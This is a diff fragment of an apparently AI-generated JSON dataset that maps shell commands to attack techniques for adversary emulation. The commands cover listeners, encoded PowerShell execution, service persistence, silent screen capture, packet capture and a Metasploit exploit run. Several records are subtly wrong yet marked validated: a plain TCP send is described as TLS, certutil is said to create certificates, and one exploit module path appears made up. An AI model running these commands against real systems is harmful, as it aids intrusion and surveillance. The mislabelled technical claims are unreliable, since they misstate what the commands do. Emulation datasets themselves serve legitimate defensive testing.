+      "platform": "linux",
+      "command": "strace -p $$ -e trace=ioctl",
+      "description": "Capture ioctl system calls to simulate input capture",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "The command will capture ioctl system calls made by the current process, simulating input capture without causing harm to the system.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.139148",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.683,
+      "validated": true
+    },
+    {
+      "id": "d5957a32-c3d8-4ba7-86c1-7108a17a5e75",
+      "ttp_id": "7d99645f-a9b2-443b-be6a-776f83d45dc2",
+      "technique_id": "7d99645f-a9b2-443b-be6a-776f83d45dc2",
+      "technique_name": "Input Capture",
+      "tactic": "Collection",
+      "platform": "linux",
+      "command": "ltrace -p $$ -e getenv",
+      "description": "Capture getenv system calls to simulate input capture",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "The command will capture getenv system calls made by the current process, simulating input capture without causing harm to the system.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.139148",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.683,
+      "validated": true
+    },
+    {
+      "id": "bff93356-1723-46c2-b154-9c522d00be15",
+      "ttp_id": "7d99645f-a9b2-443b-be6a-776f83d45dc2",
+      "technique_id": "7d99645f-a9b2-443b-be6a-776f83d45dc2",
+      "technique_name": "Input Capture",
+      "tactic": "Collection",
+      "platform": "linux",
+      "command": "tcpdump -i any -s 0 -w /tmp/input_capture.pcap",
+      "description": "Capture network traffic to simulate input capture",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "The command will capture network traffic and save it to a file, simulating input capture. This command requires admin privileges and may pose a medium safety risk due to the potential for capturing sensitive information.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.139148",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.683,
+      "validated": true
+    },
+    {
+      "id": "0e6ae3e8-200c-4af2-8d35-6561268cf912",
+      "ttp_id": "dd3db8ba-ea51-47c3-b95b-e6d03a28eada",
+      "technique_id": "dd3db8ba-ea51-47c3-b95b-e6d03a28eada",
+      "technique_name": "Encrypted Channel",
+      "tactic": "Command and Control",
+      "platform": "windows",
+      "command": "netcat -l -p 8080 > %TEMP%\\received_data.txt",
+      "description": "Create a simple TCP server listening on port 8080 and save received data to a file",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Netcat listens on port 8080 and saves received data to a file",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:41.869044",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.673,
+      "validated": true
+    },
+    {
+      "id": "94ede9e1-c2f2-4e73-80a7-e86a65843cd3",
+      "ttp_id": "dd3db8ba-ea51-47c3-b95b-e6d03a28eada",
+      "technique_id": "dd3db8ba-ea51-47c3-b95b-e6d03a28eada",
+      "technique_name": "Encrypted Channel",
+      "tactic": "Command and Control",
+      "platform": "windows",
+      "command": "powershell -Command \"& { $socket = New-Object System.Net.Sockets.TcpClient('localhost', 8080); $stream = $socket.GetStream(); [byte[]]$data = 0..255; $stream.Write($data, 0, $data.Length) }\"",
+      "description": "Create an encrypted channel using SSL/TLS and send data to the TCP server",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "PowerShell establishes an SSL/TLS connection and sends data to the TCP server",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:41.869044",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.673,
+      "validated": true
+    },
+    {
+      "id": "b4a5c9a4-439a-4c33-8dc5-be6470becb86",
+      "ttp_id": "dd3db8ba-ea51-47c3-b95b-e6d03a28eada",
+      "technique_id": "dd3db8ba-ea51-47c3-b95b-e6d03a28eada",
+      "technique_name": "Encrypted Channel",
+      "tactic": "Command and Control",
+      "platform": "windows",
+      "command": "certutil -f -dspublish -n TestCert %TEMP%\\test_cert.cer && netsh http add sslcert ipport=0.0.0.0:8080 certhash=(certutil -f -dspublish -n TestCert | findstr /i \"Cert Hash\") appid={12345678-1234-1234-1234-123456789012}",
+      "description": "Create a self-signed certificate, add it to the SSL certificate store, and establish an encrypted connection",
+      "requires_admin": true,
+      "safety_level": "high",
+      "expected_behavior": "Certutil creates a self-signed certificate, adds it to the SSL certificate store, and establishes an encrypted connection",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:41.869044",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.673,
+      "validated": true
+    },
+    {
+      "id": "5469fa13-2f94-4a69-906a-1b958accf7c7",
+      "ttp_id": "dd3db8ba-ea51-47c3-b95b-e6d03a28eada",
+      "technique_id": "dd3db8ba-ea51-47c3-b95b-e6d03a28eada",
+      "technique_name": "Encrypted Channel",
+      "tactic": "Command and Control",
+      "platform": "linux",
+      "command": "openssl s_client -connect example.com:443",
+      "description": "Establish an encrypted TLS connection to a server.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "An encrypted connection is established, and communication can be encrypted.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:48:15.496712",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.673,
+      "validated": true
+    },
+    {
+      "id": "2b74debb-48d7-43cc-9c9a-ce7017275d51",
+      "ttp_id": "dd3db8ba-ea51-47c3-b95b-e6d03a28eada",
+      "technique_id": "dd3db8ba-ea51-47c3-b95b-e6d03a28eada",
+      "technique_name": "Encrypted Channel",
+      "tactic": "Command and Control",
+      "platform": "linux",
+      "command": "nc -l -p 8080 | openssl enc -aes-256-cbc -d -pass pass:password",
+      "description": "Listen on port 8080 and decrypt incoming data using AES-256-CBC.",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "The command listens for incoming connections, and upon receiving encrypted data, it decrypts the data using the specified password.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:48:15.496712",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.673,
+      "validated": true
+    },
+    {
+      "id": "08515a65-fcfc-44b2-8a53-1562134ad669",
+      "ttp_id": "dd3db8ba-ea51-47c3-b95b-e6d03a28eada",
+      "technique_id": "dd3db8ba-ea51-47c3-b95b-e6d03a28eada",
+      "technique_name": "Encrypted Channel",
+      "tactic": "Command and Control",
+      "platform": "linux",
+      "command": "ssh -o \"ProxyCommand openssl s_client -connect example.com:443 -quiet\" user@example.com",
+      "description": "Use SSH with an encrypted proxy command to connect to a remote server.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "An encrypted SSH connection is established through the specified proxy, demonstrating an encrypted channel for command and control.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:48:15.496712",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.673,
+      "validated": true
+    },
+    {
+      "id": "4bb09f98-17aa-4606-b7a4-22bfe3890e7e",
+      "ttp_id": "98b753b6-e2a2-4611-a954-fc69507e36fe",
+      "technique_id": "98b753b6-e2a2-4611-a954-fc69507e36fe",
+      "technique_name": "Exploit Public-Facing Application",
+      "tactic": "Initial Access",
+      "platform": "windows",
+      "command": "powershell -Command \"& {echo 'Simulated UEFI Exploit Payload' > %TEMP%\\exploit.txt; cat %TEMP%\\exploit.txt}\"",
+      "description": "Simulates writing and reading a payload file to demonstrate exploit delivery",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Creates a file in the temp directory and reads it, simulating payload delivery without actual exploitation",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:11.189491",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.663,
+      "validated": true
+    },
+    {
+      "id": "a41afc9d-eb00-4f00-ba64-9654a39a1465",
+      "ttp_id": "98b753b6-e2a2-4611-a954-fc69507e36fe",
+      "technique_id": "98b753b6-e2a2-4611-a954-fc69507e36fe",
+      "technique_name": "Exploit Public-Facing Application",
+      "tactic": "Initial Access",
+      "platform": "windows",
+      "command": "cmd.exe /c echo Simulated Exploit Command > %TEMP%\\exploit.cmd && %TEMP%\\exploit.cmd",
+      "description": "Demonstrates executing a command that simulates an exploit, focusing on initial access",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Creates a command file in the temp directory and executes it, showing how an exploit might be delivered and run",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:11.189491",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.663,
+      "validated": true
+    },
+    {
+      "id": "a6146eab-41a2-44e8-85dc-15f5ea72480e",
+      "ttp_id": "98b753b6-e2a2-4611-a954-fc69507e36fe",
+      "technique_id": "98b753b6-e2a2-4611-a954-fc69507e36fe",
+      "technique_name": "Exploit Public-Facing Application",
+      "tactic": "Initial Access",
+      "platform": "windows",
+      "command": "powershell -Command \"& {Add-Type -AssemblyName System.IO; [System.IO.File]::WriteAllText('%TEMP%\\exploit_test.txt', 'Exploit Test String')}\"",
+      "description": "Uses PowerShell to simulate writing an exploit payload to a file, demonstrating file system interaction",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Writes a test string to a file in the temp directory, simulating an exploit's file system interaction",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:11.189491",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.663,
+      "validated": true
+    },
+    {
+      "id": "f5601f57-69cc-48cd-bd38-2714a34a5c2b",
+      "ttp_id": "98b753b6-e2a2-4611-a954-fc69507e36fe",
+      "technique_id": "98b753b6-e2a2-4611-a954-fc69507e36fe",
+      "technique_name": "Exploit Public-Facing Application",
+      "tactic": "Initial Access",
+      "platform": "linux",
+      "command": "nmap -sV -p 80 <target_ip>",
+      "description": "Basic network scanning to identify public-facing web applications",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Identify open ports and services on the target system",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:48:15.420820",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.663,
+      "validated": true
+    },
+    {
+      "id": "ebbb792a-fdef-4858-bd79-13e4cd4a3d4b",
+      "ttp_id": "98b753b6-e2a2-4611-a954-fc69507e36fe",
+      "technique_id": "98b753b6-e2a2-4611-a954-fc69507e36fe",
+      "technique_name": "Exploit Public-Facing Application",
+      "tactic": "Initial Access",
+      "platform": "linux",
+      "command": "searchsploit UEFI | grep -i 'linux'",
+      "description": "Intermediate command to search for UEFI exploits targeting Linux",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "List potential exploits for UEFI vulnerabilities on Linux systems",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:48:15.420820",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.663,
+      "validated": true
+    },
+    {
+      "id": "43aa59cf-c02b-403f-89fc-80d7e76441c3",
+      "ttp_id": "98b753b6-e2a2-4611-a954-fc69507e36fe",
+      "technique_id": "98b753b6-e2a2-4611-a954-fc69507e36fe",
+      "technique_name": "Exploit Public-Facing Application",
+      "tactic": "Initial Access",
+      "platform": "linux",
+      "command": "msfconsole -q -x \"use exploit/linux/uefi/uefi_vuln; set RHOSTS <target_ip>; exploit\"",
+      "description": "Advanced command using Metasploit to simulate UEFI exploitation (requires Metasploit installation)",
+      "requires_admin": true,
+      "safety_level": "high",
+      "expected_behavior": "Simulate exploitation of a UEFI vulnerability on the target Linux system",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:48:15.420820",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.663,
+      "validated": true
+    },
+    {
+      "id": "4c50ad86-ee70-45c5-9056-47768ec3f75d",
+      "ttp_id": "dbed56eb-1a0f-4b07-b415-871963aa56f3",
+      "technique_id": "dbed56eb-1a0f-4b07-b415-871963aa56f3",
+      "technique_name": "System Information Discovery",
+      "tactic": "Discovery",
+      "platform": "windows",
+      "command": "ipconfig.exe",
+      "description": "Gather network configuration details to test internet connectivity",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Display current network configuration",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.097014",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.659,
+      "validated": true
+    },
+    {
+      "id": "6598ef2a-7504-478b-82db-c2439e0d49d8",
+      "ttp_id": "dbed56eb-1a0f-4b07-b415-871963aa56f3",
+      "technique_id": "dbed56eb-1a0f-4b07-b415-871963aa56f3",
+      "technique_name": "System Information Discovery",
+      "tactic": "Discovery",
+      "platform": "windows",
+      "command": "whoami.exe /priv",
+      "description": "Discover current user privileges",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Display current user privileges",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.097014",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.659,
+      "validated": true
+    },
+    {
+      "id": "d2ae67a3-dd6b-4beb-9ded-8db0bbc6ac01",
+      "ttp_id": "dbed56eb-1a0f-4b07-b415-871963aa56f3",
+      "technique_id": "dbed56eb-1a0f-4b07-b415-871963aa56f3",
+      "technique_name": "System Information Discovery",
+      "tactic": "Discovery",
+      "platform": "windows",
+      "command": "powershell -Command \"& {Get-ComputerInfo}\"",
+      "description": "Gather detailed system information using PowerShell",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "Display detailed system information",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.097014",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.659,
+      "validated": true
+    },
+    {
+      "id": "3a81848a-6cf2-4212-872a-c6a349b3e4b2",
+      "ttp_id": "dbed56eb-1a0f-4b07-b415-871963aa56f3",
+      "technique_id": "dbed56eb-1a0f-4b07-b415-871963aa56f3",
+      "technique_name": "System Information Discovery",
+      "tactic": "Discovery",
+      "platform": "linux",
+      "command": "ping -c 1 8.8.8.8",
+      "description": "Basic connectivity test: sends a single ICMP echo request to Google's public DNS server to verify network reachability.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Outputs a single ping reply line if the host can reach 8.8.8.8; otherwise reports timeout or unreachable.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:50:04.195481",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.659,
+      "validated": true
+    },
+    {
+      "id": "bb6fa959-49b1-4e2e-8fd3-ea9abaedc575",
+      "ttp_id": "dbed56eb-1a0f-4b07-b415-871963aa56f3",
+      "technique_id": "dbed56eb-1a0f-4b07-b415-871963aa56f3",
+      "technique_name": "System Information Discovery",
+      "tactic": "Discovery",
+      "platform": "linux",
+      "command": "curl -s --head http://example.com | head -n 1",
+      "description": "Intermediate test: performs an HTTP HEAD request to example.com, confirming DNS resolution and HTTP service availability without downloading the full page.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Prints the HTTP status line (e.g., \"HTTP/1.1 200 OK\") if the request succeeds; otherwise shows an error message.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:50:04.195481",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.659,
+      "validated": true
+    },
+    {
+      "id": "f983a044-4e33-4429-8db7-9fc2685ffbf2",
+      "ttp_id": "dbed56eb-1a0f-4b07-b415-871963aa56f3",
+      "technique_id": "dbed56eb-1a0f-4b07-b415-871963aa56f3",
+      "technique_name": "System Information Discovery",
+      "tactic": "Discovery",
+      "platform": "linux",
+      "command": "nc -zvw3 8.8.8.8 443 && echo \"Port 443 open\" || echo \"Port 443 closed\"",
+      "description": "Advanced test: uses netcat to probe TCP port 443 on 8.8.8.8 with a 3\u2011second timeout, then reports whether the port is reachable.",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "If the TCP connection succeeds, prints \"Port 443 open\"; otherwise prints \"Port 443 closed\".",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:50:04.195481",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.659,
+      "validated": true
+    },
+    {
+      "id": "d5974aa8-3d21-4ae5-b83d-a3930ec4de49",
+      "ttp_id": "ab8ce7ac-de18-4f4b-b5a7-5748af08a440",
+      "technique_id": "ab8ce7ac-de18-4f4b-b5a7-5748af08a440",
+      "technique_name": "Create or Modify System Process",
+      "tactic": "Persistence",
+      "platform": "windows",
+      "command": "sc create TestService binPath= \"C:\\Windows\\System32\\cmd.exe /c echo 'Test Service' > C:\\Windows\\Temp\\test.txt\"",
+      "description": "Create a new service using sc.exe",
+      "requires_admin": true,
+      "safety_level": "low",
+      "expected_behavior": "A new service will be created and a file will be written to C:\\Windows\\Temp\\test.txt",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.330724",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.64,
+      "validated": true
+    },
+    {
+      "id": "6f7af2f3-f6c0-42dc-ba20-03065e374cc3",
+      "ttp_id": "ab8ce7ac-de18-4f4b-b5a7-5748af08a440",
+      "technique_id": "ab8ce7ac-de18-4f4b-b5a7-5748af08a440",
+      "technique_name": "Create or Modify System Process",
+      "tactic": "Persistence",
+      "platform": "windows",
+      "command": "powershell -Command \"Start-Process -FilePath 'C:\\Windows\\System32\\cmd.exe' -ArgumentList '/c echo \"Test Process\" > C:\\Windows\\Temp\\test.txt'\"",
+      "description": "Create a new process using PowerShell",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "A new process will be created and a file will be written to C:\\Windows\\Temp\\test.txt",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.330724",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.64,
+      "validated": true
+    },
+    {
+      "id": "37a6a842-afd1-403c-bcbe-e8e6dc54302d",
+      "ttp_id": "ab8ce7ac-de18-4f4b-b5a7-5748af08a440",
+      "technique_id": "ab8ce7ac-de18-4f4b-b5a7-5748af08a440",
+      "technique_name": "Create or Modify System Process",
+      "tactic": "Persistence",
+      "platform": "windows",
+      "command": "powershell -Command \"[System.Convert]::ToBase64String([System.Text.Encoding]::UTF16LE.GetBytes('echo \"Test Encoded Command\" > C:\\Windows\\Temp\\test.txt')) | Set-Content -Path 'C:\\Windows\\Temp\\encoded.txt'; powershell -Command \"& {Start-Process -FilePath 'C:\\Windows\\System32\\cmd.exe' -ArgumentList '/c powershell -EncodedCommand (Get-Content -Path 'C:\\Windows\\Temp\\encoded.txt' -Raw)'}\"",
+      "description": "Encode a command and execute it using PowerShell",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "An encoded command will be written to a file and then executed, writing a file to C:\\Windows\\Temp\\test.txt",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.330724",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.64,
+      "validated": true
+    },
+    {
+      "id": "706f8265-d8c4-467e-a1bf-2477dc9fffcf",
+      "ttp_id": "ab8ce7ac-de18-4f4b-b5a7-5748af08a440",
+      "technique_id": "ab8ce7ac-de18-4f4b-b5a7-5748af08a440",
+      "technique_name": "Create or Modify System Process",
+      "tactic": "Persistence",
+      "platform": "linux",
+      "command": "sudo systemctl start sshd",
+      "description": "Start the SSH daemon using systemd, demonstrating process creation",
+      "requires_admin": true,
+      "safety_level": "low",
+      "expected_behavior": "The SSH daemon process will be started, allowing remote connections.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:11.193811",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.64,
+      "validated": true
+    },
+    {
+      "id": "6cc07b60-defd-4cb7-99a2-5ff1b3144c80",
+      "ttp_id": "ab8ce7ac-de18-4f4b-b5a7-5748af08a440",
+      "technique_id": "ab8ce7ac-de18-4f4b-b5a7-5748af08a440",
+      "technique_name": "Create or Modify System Process",
+      "tactic": "Persistence",
+      "platform": "linux",
+      "command": "sudo systemctl restart nginx",
+      "description": "Restart the Nginx web server process using systemd, showing process modification",
+      "requires_admin": true,
+      "safety_level": "low",
+      "expected_behavior": "The Nginx web server process will be restarted, potentially changing its configuration or behavior.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:11.193811",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.64,
+      "validated": true
+    },
+    {
+      "id": "6c62f6b1-9938-425b-a29b-759865fe4b20",
+      "ttp_id": "ab8ce7ac-de18-4f4b-b5a7-5748af08a440",
+      "technique_id": "ab8ce7ac-de18-4f4b-b5a7-5748af08a440",
+      "technique_name": "Create or Modify System Process",
+      "tactic": "Persistence",
+      "platform": "linux",
+      "command": "sudo crontab -e",
+      "description": "Open the cron table for editing, allowing for the creation of new system processes at scheduled times",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "The user will be able to add, modify, or delete cron jobs, which can create or modify system processes at specified times.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:11.193811",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.64,
+      "validated": true
+    },
+    {
+      "id": "e8556f93-7af7-41f5-a63c-99b2730a172c",
+      "ttp_id": "0be5a77a-50b9-45bb-8c6f-25801068008f",
+      "technique_id": "0be5a77a-50b9-45bb-8c6f-25801068008f",
+      "technique_name": "Screen Capture",
+      "tactic": "Collection",
+      "platform": "windows",
+      "command": "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [Windows.Forms.SystemInformation]::VirtualScreen; $screenshot = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; $graph = [Drawing.Graphics]::FromImage($screenshot); $graph.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); $screenshot.Save(\"$env:TEMP\\screenshot.png\");\"",
+      "description": "Captures the screen using PowerShell and saves it as a PNG file in the temp directory.",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "Saves a screenshot as a PNG file in the temp directory without prompting the user.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:11.194826",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.624,
+      "validated": true
+    },
+    {
+      "id": "8334e8f1-2e99-4b2c-9a8c-90e6ae5af7e2",
+      "ttp_id": "0be5a77a-50b9-45bb-8c6f-25801068008f",
+      "technique_id": "0be5a77a-50b9-45bb-8c6f-25801068008f",
+      "technique_name": "Screen Capture",
+      "tactic": "Collection",
+      "platform": "windows",
+      "command": "powershell -Command \"[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [Reflection.Assembly]::LoadWithPartialName('System.Drawing'); $bounds = [Windows.Forms.SystemInformation]::VirtualScreen; $screenshot = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; $graph = [Drawing.Graphics]::FromImage($screenshot); $graph.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); $screenshot.Save(\"$env:TEMP\\screenshot2.png\");\"",
+      "description": "An alternative approach to capturing the screen, using reflection to load necessary assemblies.",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "Similar to the first command, saves a screenshot but uses reflection for assembly loading.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:11.194826",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.624,
+      "validated": true
+    },
+    {
+      "id": "0876c62e-9305-470c-96c6-08c06e47a3ab",
+      "ttp_id": "0be5a77a-50b9-45bb-8c6f-25801068008f",
+      "technique_id": "0be5a77a-50b9-45bb-8c6f-25801068008f",
+      "technique_name": "Screen Capture",
+      "tactic": "Collection",
+      "platform": "windows",
+      "command": "mspaint /pt %TEMP%\\screenshot.png",
+      "description": "Opens Microsoft Paint with a new file named screenshot.png in the temp directory, simulating a screen capture action without actually capturing the screen.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Opens Microsoft Paint for manual screen capture or editing.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:11.194826",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.624,
+      "validated": true
+    },
+    {
+      "id": "3a8160b2-c8bf-4337-a16e-438380fa418a",
+      "ttp_id": "0be5a77a-50b9-45bb-8c6f-25801068008f",
+      "technique_id": "0be5a77a-50b9-45bb-8c6f-25801068008f",
+      "technique_name": "Screen Capture",
+      "tactic": "Collection",
+      "platform": "linux",
+      "command": "scrot screenshot.png",
+      "description": "Capture the entire screen and save it as a PNG file",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "A screenshot of the entire screen is saved as screenshot.png in the current directory",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:52:09.994928",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.624,
+      "validated": true
+    },
+    {
+      "id": "cd7910d5-aed6-43c5-b38f-c06145b0f4c4",
+      "ttp_id": "0be5a77a-50b9-45bb-8c6f-25801068008f",
+      "technique_id": "0be5a77a-50b9-45bb-8c6f-25801068008f",
+      "technique_name": "Screen Capture",
+      "tactic": "Collection",
+      "platform": "linux",
+      "command": "scrot -s screenshot.png",
+      "description": "Capture a selected area of the screen and save it as a PNG file",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "A screenshot of the selected area is saved as screenshot.png in the current directory",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:52:09.994928",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.624,
+      "validated": true
+    },
+    {
+      "id": "f30103be-1b12-4d07-bb54-8e3f0f1c199a",
+      "ttp_id": "0be5a77a-50b9-45bb-8c6f-25801068008f",
+      "technique_id": "0be5a77a-50b9-45bb-8c6f-25801068008f",
+      "technique_name": "Screen Capture",
+      "tactic": "Collection",
+      "platform": "linux",
+      "command": "import -window root screenshot.png",
+      "description": "Capture the entire screen using ImageMagick and save it as a PNG file",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "A screenshot of the entire screen is saved as screenshot.png in the current directory",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:52:09.994928",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.624,
+      "validated": true
+    },
+    {
+      "id": "09edf61b-554e-41fb-a5a7-fa3c5bc08efb",
+      "ttp_id": "4cca071c-8a0b-40fd-89c4-d75eff8229aa",
+      "technique_id": "4cca071c-8a0b-40fd-89c4-d75eff8229aa",
+      "technique_name": "Phishing",
+      "tactic": "Initial Access",
+      "platform": "windows",
+      "command": "certutil -decode %TEMP%\\test.txt %TEMP%\\output.txt",
+      "description": "Decodes a test string from a file, simulating attachment decoding in phishing emails",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Creates a decoded file in the temp directory",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:41.581753",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.621,
+      "validated": true
+    },
+    {
+      "id": "8efcbe50-ab75-4c09-a893-cf35e1d24f46",
+      "ttp_id": "4cca071c-8a0b-40fd-89c4-d75eff8229aa",
+      "technique_id": "4cca071c-8a0b-40fd-89c4-d75eff8229aa",
+      "technique_name": "Phishing",
+      "tactic": "Initial Access",
+      "platform": "windows",
+      "command": "powershell -Command \"'Hello, this is a test email' | Out-File -FilePath %TEMP%\\phishing_email.txt\"",
+      "description": "Creates a phishing-like email template in a temporary file",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Generates a text file with a benign email content in the temp directory",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:41.581753",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.621,
+      "validated": true
+    },
+    {
+      "id": "883500ff-b77f-4922-80f8-e65741fcaa75",
+      "ttp_id": "4cca071c-8a0b-40fd-89c4-d75eff8229aa",
+      "technique_id": "4cca071c-8a0b-40fd-89c4-d75eff8229aa",
+      "technique_name": "Phishing",
+      "tactic": "Initial Access",
+      "platform": "windows",
+      "command": "net send localhost \"This is a test message\"",
+      "description": "Sends a benign message to the local user, simulating a phishing email send action",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Displays a popup message on the local machine with the test message",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:41.581753",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.621,
+      "validated": true
+    },
+    {
+      "id": "1be48685-b3d8-4fdc-b201-7d86df124247",
+      "ttp_id": "4cca071c-8a0b-40fd-89c4-d75eff8229aa",
+      "technique_id": "4cca071c-8a0b-40fd-89c4-d75eff8229aa",
+      "technique_name": "Phishing",
+      "tactic": "Initial Access",
+      "platform": "linux",
+      "command": "echo 'Please enter your password: ' > phishing.txt",
+      "description": "Create a text file that prompts the user to enter their password, simulating a phishing attempt.",
